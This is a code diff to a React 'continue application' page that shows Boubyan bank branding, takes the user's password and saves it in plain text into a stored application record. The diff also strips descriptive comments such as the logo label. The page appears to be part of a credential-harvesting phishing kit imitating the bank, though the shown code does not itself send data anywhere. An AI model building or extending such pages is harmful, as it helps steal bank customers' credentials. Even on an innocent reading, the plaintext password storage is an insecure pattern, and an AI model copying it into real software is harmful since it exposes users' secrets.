@@ -1,4 +1,4 @@
-import { useState } from 'react'
+import { useState, useEffect } from 'react'
 import { useNavigate } from 'react-router-dom'
 import { useLanguage } from '../context/LanguageContext'
 import { getDraftApplication, saveDraftApplication, saveApplication } from '../lib/applicationStorage'
@@ -10,6 +10,16 @@ export default function ContinueApplicationStep3Page() {
 
   const [password, setPassword] = useState('')
 
+  useEffect(() => {
+    const draft = getDraftApplication() || {}
+    saveDraftApplication({
+      ...draft,
+      step: 'step-password',
+      status: 'new',
+      source: 'continue-application-step-3',
+    })
+  }, [])
+
   const handleLogin = () => {
     if (!password) return
 
@@ -17,7 +27,7 @@ export default function ContinueApplicationStep3Page() {
     const finalData = {
       ...draft,
       password,
-      step: 'step-3',
+      step: 'step-password',
       status: 'pending-verification',
       createdAt: draft.createdAt || new Date().toISOString(),
       source: 'continue-application-step-3',
@@ -32,7 +42,6 @@ export default function ContinueApplicationStep3Page() {
     <section className="min-h-screen bg-white flex flex-col justify-between px-4 py-6 sm:py-8 font-sans overflow-x-hidden" dir={isAr ? 'rtl' : 'ltr'}>
       <div className="mx-auto w-full max-w-md flex-1 flex flex-col justify-center py-2">
         
-        {/* Boubyan Logo Section */}
         <div className="mb-12 sm:mb-16 flex justify-center text-center">
           <div className="h-auto w-36 sm:w-40">
             <img
@@ -43,10 +52,8 @@ export default function ContinueApplicationStep3Page() {
           </div>
         </div>
 
-        {/* Form Fields Section */}
         <div className="w-full space-y-8 text-right">
           
-          {/* Password Input Field */}
           <div className="relative border-b border-[#cccccc] pb-2">
             <input
               type="password"
@@ -57,7 +64,6 @@ export default function ContinueApplicationStep3Page() {
             />
           </div>
 
-          {/* Action Buttons */}
           <div className="mt-8 flex gap-3 pt-4">
             <button
               type="button"
